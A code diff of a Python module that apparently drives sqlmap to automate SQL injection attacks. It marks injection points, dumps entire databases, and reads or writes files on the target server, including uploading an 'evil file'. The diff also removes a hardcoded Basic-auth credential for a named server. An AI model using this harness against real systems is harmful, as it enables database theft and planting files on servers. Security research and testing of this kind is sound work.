@@ -195,6 +195,7 @@ def sqlmap_parse_data_extracted(sqlmap_output):
     return extracted_values
 
 
+# sqlmap_details: url, methos, params [action]
 
 def execute_sqlmap(sqlmap_details):
     global data_to_extract
@@ -208,31 +209,55 @@ def execute_sqlmap(sqlmap_details):
 
     url = sqlmap_details["url"]
     method = sqlmap_details["method"]
-    if "params" in sqlmap_details:
-        params = sqlmap_details["params"]
+    vuln_param = sqlmap_details["vuln_param"]
+
+    url_params = ""
+    if "get_params" in sqlmap_details:
+        params = sqlmap_details["get_params"]
         url_params = ""
-        for k,v in params.items():
-            url_params = url_params+k+"="+v+"&"
+        for ab_k,real_c in params.items():
+            # specify an injection point
+            if ab_k == vuln_param:
+                url_params = url_params+real_c[0]+"="+real_c[1]+"*&"
+            else:
+                url_params = url_params+real_c[0]+"="+real_c[1]+"&"
         url_params = url_params[:-1]
-        if method == "GET":
-            url = url+"?"+url_params
-            sqlmap.set_option("url",url,task)
-        elif method == "POST":
-            sqlmap.set_option("url",url,task)
-            sqlmap.set_option("data",url_params,task)
 
+    body_params = ""
+    if "post_params" in sqlmap_details:
+        params = sqlmap_details["post_params"]
+        body_params = ""
+        for ab_k,real_c in params.items():
+            # specify an injection point
+            if ab_k == vuln_param:
+                body_params = body_params+real_c[0]+"="+real_c[1]+"*&"
+            else:
+                body_params = body_params+real_c[0]+"="+real_c[1]+"&"
+        body_params = body_params[:-1]
 
+    url = url+"?"+url_params
+    sqlmap.set_option("url",url,task)
 
-    # hardcoded configuration for the univr server
-    # TODO: make it configurable from the command line
-    sqlmap.set_option("authType","Basic",task)
-    sqlmap.set_option("authCred","regis:password",task)
-    #sqlmap.set_option("dropSetCookie","false",task)
+    if method == "POST":
+        sqlmap.set_option("data",body_params,task)
+
+    # if "params" in sqlmap_details:
+    #     params = sqlmap_details["params"]
+    #     url_params = ""
+    #     for k,v in params.items():
+    #         url_params = url_params+k+"="+v+"&"
+    #     url_params = url_params[:-1]
+    #     if method == "GET":
+    #         url = url+"?"+url_params
+    #         sqlmap.set_option("url",url,task)
+    #     elif method == "POST":
+    #         sqlmap.set_option("url",url,task)
+    #         sqlmap.set_option("data",url_params,task)
 
     # set cookie if present and should be considered
-    if config.keep_cookie and config.cookies != None:
+    if "cookies" in sqlmap_details:
         c = ""
-        for k,v in config.cookies.items():
+        for k,v in sqlmap_details["cookies"].items():
             c = c + k + "=" + v + ";"
         debugMsg = "sqlmap with cookie {}".format(c)
         logger.debug(debugMsg)
@@ -255,25 +280,26 @@ def execute_sqlmap(sqlmap_details):
             col = col + tbl_list[1]
         sqlmap.set_option("tbl",tbl,task)
         sqlmap.set_option("col",col,task)
+
+    if "dumpall" in sqlmap_details:
+        # dump the entire database
+        sqlmap.set_option("dumpAll","true",task)
+
     # file read
     if "read" in sqlmap_details:
         file_to_extract = sqlmap_details["read"]
-        # TODO: ask if you want to change the file or continue ?
         sqlmap.set_option("rFile",file_to_extract,task)
     # file write
     if "write" in sqlmap_details:
 
         file_to_write = sqlmap_details["write"]
+        remote_path = sqlmap_details["path"]
         if not isfile(file_to_write):
-            debug.critical("Error: evil file not found")
+            criticalMsg = "Error: {} file not found".format(file_to_write)
+            debug.critical(criticalMsg)
             exit()
         sqlmap.set_option("wFile",join(".",file_to_write),task)
-
-        path = ""
-        while path == "":
-            path = input("Where to upload the file?\n")
-
-        sqlmap.set_option("dFile",path,task)
+        sqlmap.set_option("dFile",remote_path,task)
     # second order
     if "secondOrder" in sqlmap_details:
         secondOrder_url = sqlmap_details["secondOrder"]
